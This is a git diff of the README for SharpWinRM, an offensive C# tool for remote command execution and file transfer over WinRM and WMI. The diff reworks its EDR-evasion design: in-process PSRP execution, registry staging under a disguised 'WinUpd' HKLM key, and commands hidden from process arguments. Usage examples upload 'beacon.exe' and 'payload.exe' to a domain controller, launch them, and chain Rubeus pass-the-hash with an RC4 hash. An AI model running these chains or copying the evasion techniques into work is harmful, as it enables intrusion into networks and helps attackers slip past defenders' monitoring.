@@ -67,16 +67,17 @@ WinRM (Windows Remote Management) is Microsoft's implementation of the [WS-Manag
 
 All communication is SOAP XML over HTTP(S). SharpWinRM uses the **WSMan.Automation COM object** (`wsmauto.dll`) — the same library used by PowerShell Remoting and the built-in `winrm.exe` — so the WinRM traffic is indistinguishable from legitimate Windows remote management activity.
 
-### Shell Execution Model
+### Execution Model
 
-For `exec` and `download`, SharpWinRM:
+SharpWinRM uses two distinct remote execution mechanisms depending on the operation:
 
-1. Creates a WS-Management shell resource (`cmd.exe`) via a WS-Transfer `Create` request
-2. Sends a `Command` action to start the process
-3. Polls with `Receive` actions to collect stdout/stderr
-4. Sends a `Signal` (ctrl_c) to terminate, then deletes the shell
+**`exec` — PowerShell Remoting Protocol (PSRP)**
 
-For `upload`, the shell runs `powershell.exe` directly and the file data is streamed into the process via the WS-Management `Send` (stdin) action.
+Opens a PSRP runspace via `WSManConnectionInfo` targeting the `Microsoft.PowerShell` endpoint. The PowerShell engine runs in-process inside `wsmprovhost.exe` — no child process is spawned, and the command never appears in any process argument list. Identical to `Invoke-Command`.
+
+**`upload` / `download` — WMI Method Invocation over WS-Man**
+
+Uses `StdRegProv` and `Win32_Process` WMI methods delivered as WS-Man SOAP actions — not the WinRM shell API. The remote process tree shows `wmiprvse.exe` (WMI host), not `wsmprovhost.exe` (WinRM host), making it appear as WMI activity rather than WinRM activity. File data and paths travel as base64-encoded registry values, never as plain-text process arguments.
 
 ### HTTP vs HTTPS
 
@@ -214,54 +215,38 @@ TCP connect check on ports 5985 and 5986. No authentication required. Use this f
 ### `exec` — Command Execution
 
 ```
-SharpWinRM.exe exec /target:HOST <auth> /command:CMD
+SharpWinRM.exe exec /target:HOST <auth> /command:PS_COMMAND
 ```
 
-Runs `cmd.exe /c CMD` on the remote host and returns stdout+stderr.
-
-Commands with spaces are supported without quoting:
-```
-SharpWinRM.exe exec ... /command:dir C:\Windows\Temp
-SharpWinRM.exe exec ... /command:net user administrator
-```
-
-**Remote process chain:** `svchost → WsmService → cmd.exe /c CMD`
-
----
-
-### `invoke` — PowerShell Execution via stdin
+Executes a PowerShell command using the **PowerShell Remoting Protocol (PSRP)** — the same protocol used by `Invoke-Command` and `Enter-PSSession`. Accepts any PowerShell syntax including pipelines:
 
 ```
-SharpWinRM.exe invoke /target:HOST <auth> /command:PS_COMMAND
+SharpWinRM.exe exec ... /command:whoami
+SharpWinRM.exe exec ... /command:Get-LocalUser
+SharpWinRM.exe exec ... /command:Get-Process | Select-Object Name,Id | Sort-Object Id
 ```
 
-Executes a PowerShell command on the remote host by piping it through the WinRM stdin channel — the same delivery mechanism used by `upload`. The command never appears in any process argument list.
+**Remote process tree:** `svchost.exe (WsmSvc) → wsmprovhost.exe`
 
+No `cmd.exe`, no `powershell.exe` child — the PowerShell engine runs in-process inside `wsmprovhost.exe` via `pwrshplugin.dll`. The command never appears in any process argument list. This is identical to what a legitimate admin session produces.
+
+**How it works:**
+
+Uses `System.Management.Automation.dll` (Windows PowerShell 5.1, present on all modern Windows) to open a PSRP runspace via `WSManConnectionInfo` targeting:
 ```
-SharpWinRM.exe invoke ... /command:Get-LocalUser
-SharpWinRM.exe invoke ... /command:Get-Process | Select Name,Id
+http://schemas.microsoft.com/powershell/Microsoft.PowerShell
 ```
-
-**Remote process chain:** `svchost → powershell.exe -NoProfile -NonInteractive -`
-
-**How it differs from `exec`:**
-
-| | `exec` | `invoke` |
-|---|---|---|
-| Remote process | `cmd.exe /c <command>` | `powershell.exe -NoProfile -NonInteractive -` |
-| Command in process args | **Yes** — Sysmon Event ID 1 | **No** — travels through WinRM stdin |
-| PowerShell Script Block Logging | N/A | Captured if enabled (Event ID 4104) |
-| AMSI inspection | No | Yes — at runtime |
-| Accepts PowerShell syntax | No | Yes |
+Output is piped through `Out-String` so complex objects (`Get-Process`, `Get-LocalUser`, etc.) render as formatted text.
 
 **What EDR sees on the remote host:**
-- Process creation: `powershell.exe -NoProfile -NonInteractive -`
-- Command line contains **no command data** — data travels through the WinRM stdin channel
-- If PowerShell Script Block Logging is enabled, the command will be captured in Event ID 4104
+- `wsmprovhost.exe` activity — indistinguishable from `Invoke-Command` or `Enter-PSSession`
+- No child process spawned — no Sysmon Event ID 1 for the command
+- AMSI inspects the script block at runtime inside `wsmprovhost.exe`
+- Script Block Logging (Event ID 4104) captures the command if enabled
 
 ---
 
-### `upload` — File Upload
+### `upload` — File Upload via WMI
 
 ```
 SharpWinRM.exe upload /target:HOST <auth> /local:C:\tools\beacon.exe /remote:C:\Windows\Temp
@@ -274,35 +259,65 @@ If `/remote:` is a directory path (no file extension, or trailing `\`), the loca
 /remote:C:\Windows\Temp\b.exe    → C:\Windows\Temp\b.exe
 ```
 
-**How it works (opsec design):**
+**Remote process tree:**
+```
+svchost.exe (WinMgmt)
+  └── wmiprvse.exe
+        └── powershell.exe -EncodedCommand <b64>  [brief — reassembly only]
+```
 
-1. Reads the local file and splits into 48 KB binary chunks
-2. Each chunk is base64-encoded into a PowerShell `[IO.File]::OpenWrite` / `Write` statement
-3. The complete PS script is UTF-8 encoded and streamed to the remote via the **WinRM `Send` (stdin) action**
-4. Remote process: `powershell.exe -NoProfile -NonInteractive -` (stdin mode)
+**How it works:**
+
+1. **`StdRegProv.CreateKey` + `SetStringValue` (loop)** — stages 48 KB base64-encoded chunks into a randomly named HKLM subkey. No child process — handled entirely inside `wmiprvse.exe`.
+2. **`Win32_Process.Create`** — spawns a brief `powershell.exe` with `-EncodedCommand` to read the chunks from registry, write to the target file, then set a `done` sentinel. File data and path are not in plain-text process args.
+3. **`Win32_Process?Handle=<pid>` (poll)** — polls the spawned PID via WS-Man Get every second until the process exits. No separate child process.
+4. **`StdRegProv.GetStringValue`** — reads the `done` sentinel once after the process exits to detect any remote write error.
+5. **`StdRegProv.DeleteKey`** — removes the entire staging key. No child process.
+
+**Staging location:** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Diagnostics\WinUpd_<random>`
 
 **What EDR sees on the remote host:**
-- Process creation: `powershell.exe -NoProfile -NonInteractive -`
-- Command line contains **no file data** — data travels through the WinRM stdin channel
-- If PowerShell Script Block Logging is enabled, the decode script (including base64 chunks) will be captured in the event log
+- WMI activity on `wmiprvse.exe` for all registry staging operations (no process created)
+- Brief `powershell.exe` child of `wmiprvse.exe` — parent is WMI host, not WinRM svchost
+- File data never appears in any process command line
+- Registry write + delete at a plausible-looking HKLM path
 
 ---
 
-### `download` — File Download
+### `download` — File Download via WMI
 
 ```
-SharpWinRM.exe download /target:HOST <auth> /remote:C:\Windows\Temp\output.txt /local:output.txt
+SharpWinRM.exe download /target:HOST <auth> /remote:C:\path\file.txt /local:output.txt
+SharpWinRM.exe download /target:HOST <auth> /remote:C:\path\file.txt /local:C:\Users\me\
+SharpWinRM.exe download /target:HOST <auth> /remote:C:\path\file.txt
 ```
 
-**How it works (opsec design):**
+`/local:` is optional. If omitted, the file is saved to the current directory using the remote filename. If `/local:` points to an existing directory or ends with `\`, the remote filename is appended automatically:
+```
+(omitted)                    → .\file.txt  (current directory)
+/local:C:\Users\me           → C:\Users\me\file.txt
+/local:C:\Users\me\out.txt   → C:\Users\me\out.txt
+```
 
-Runs `cmd.exe /c type "remote_path"` — no PowerShell spawned. Raw bytes flow through the WinRM stdout pipe (binary-safe via pipe mode) and are written directly to the local file.
+**Remote process tree:**
+```
+svchost.exe (WinMgmt)
+  └── wmiprvse.exe
+        └── powershell.exe -EncodedCommand <b64>  [brief — encoding only]
+```
+
+**How it works:**
+
+1. **`Win32_Process.Create`** — spawns a brief `powershell.exe` with `-EncodedCommand` to base64-encode the remote file and write it to a randomly named HKLM staging value. File path not in plain-text args.
+2. **`StdRegProv.GetStringValue` (poll)** — reads the staged data. No child process — pure `wmiprvse.exe`.
+3. **`StdRegProv.DeleteValue`** — removes the staging value. No child process.
+
+**Staging location:** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Diagnostics\<random value>`
 
 **What EDR sees on the remote host:**
-- Process creation: `cmd.exe /c type "C:\path\file.txt"`
-- No PowerShell, no AMSI, no script block logging
-
-> **Note:** `type` reads through a stdout pipe which is binary-safe on modern Windows for most file types. Files containing `0x1A` bytes (Ctrl-Z, rare in text files but possible in PE binaries) may be truncated. For downloading executables, use SMB directly.
+- Brief `powershell.exe` child of `wmiprvse.exe` (parent is WMI host, not WinRM svchost)
+- File path not visible in process args (encoded command)
+- Registry read via WMI (no child process) for the actual data retrieval
 
 ---
 
@@ -316,12 +331,11 @@ Runs `cmd.exe /c type "remote_path"` — no PowerShell spawned. Raw bytes flow t
 
 ### Remote machine (target)
 
-| Operation | Remote process | Data in command line |
+| Operation | Remote process tree | Data in command line |
 |---|---|---|
-| `exec` | `cmd.exe /c <command>` | Yes — the command |
-| `invoke` | `powershell.exe -NoProfile -NonInteractive -` | No — command via stdin |
-| `upload` | `powershell.exe -NoProfile -NonInteractive -` | No — data via stdin |
-| `download` | `cmd.exe /c type "path"` | No — path only |
+| `exec` | `svchost (WsmSvc) → wsmprovhost.exe` (no children) | No process spawned |
+| `upload` | `svchost (WinMgmt) → wmiprvse.exe → powershell.exe` (brief) | No — path/data in encoded command |
+| `download` | `svchost (WinMgmt) → wmiprvse.exe → powershell.exe` (brief) | No — path in encoded command |
 
 ### Authentication opsec ranking
 
@@ -360,21 +374,18 @@ SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ticket:jdoe.kirbi /command:wh
 # Upload payload (PowerShell via stdin — no data in command line)
 SharpWinRM.exe upload /target:srv01 /user:CORP\jdoe /ptt /local:beacon.exe /remote:C:\Windows\Temp
 
-# Execute uploaded payload (exec — process args visible but it's just a path)
-SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ptt /command:C:\Windows\Temp\beacon.exe
+# Execute command via PSRP (wsmprovhost.exe only — no child process, blends with admin traffic)
+SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ptt /command:whoami
+SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ptt /command:Get-LocalUser
 
-# Invoke PowerShell command via stdin (command NOT in process args — no Sysmon EID 1 logging)
-SharpWinRM.exe invoke /target:srv01 /user:CORP\jdoe /ptt /command:Get-LocalUser
-SharpWinRM.exe invoke /target:srv01 /user:CORP\jdoe /ptt /command:whoami /groups
-
-# Download output file (cmd.exe type — no PowerShell)
+# Download output file via WMI (wmiprvse.exe — path not in process args)
 SharpWinRM.exe download /target:srv01 /user:CORP\jdoe /ptt /remote:C:\Windows\Temp\output.txt /local:output.txt
 
 # Full PTH chain over HTTPS
 Rubeus.exe asktgt /user:svc_admin /rc4:A87F3A337D73085C45F9416BE5787D86 /domain:CORP /outfile:svc.kirbi
 SharpWinRM.exe scan    /target:dc01.corp.local
 SharpWinRM.exe upload  /target:dc01.corp.local /user:CORP\svc_admin /ticket:svc.kirbi /ssl /local:payload.exe /remote:C:\Windows\Temp
-SharpWinRM.exe invoke  /target:dc01.corp.local /user:CORP\svc_admin /ticket:svc.kirbi /ssl /command:Start-Process C:\Windows\Temp\payload.exe
+SharpWinRM.exe exec    /target:dc01.corp.local /user:CORP\svc_admin /ticket:svc.kirbi /ssl /command:Start-Process C:\Windows\Temp\payload.exe
 SharpWinRM.exe download /target:dc01.corp.local /user:CORP\svc_admin /ticket:svc.kirbi /ssl /remote:C:\Windows\Temp\out.txt /local:out.txt
 ```
 
@@ -387,10 +398,9 @@ SharpWinRM.exe <command> [options]
 
 COMMANDS
   scan      /target:HOST
-  exec      /target:HOST <auth> /command:CMD          (cmd.exe — command visible in process args)
-  invoke    /target:HOST <auth> /command:PS_COMMAND   (PowerShell stdin — command NOT in process args)
-  upload    /target:HOST <auth> /local:PATH /remote:PATH
-  download  /target:HOST <auth> /remote:PATH /local:PATH
+  exec      /target:HOST <auth> /command:PS_COMMAND   (PSRP — wsmprovhost.exe, no child process)
+  upload    /target:HOST <auth> /local:PATH /remote:PATH        (WMI registry staging — wmiprvse.exe)
+  download  /target:HOST <auth> /remote:PATH [/local:PATH]      (WMI registry staging — wmiprvse.exe)
 
 AUTH (pick one)
   /password:PASS     Plaintext password (requires /user: and optionally /domain:)
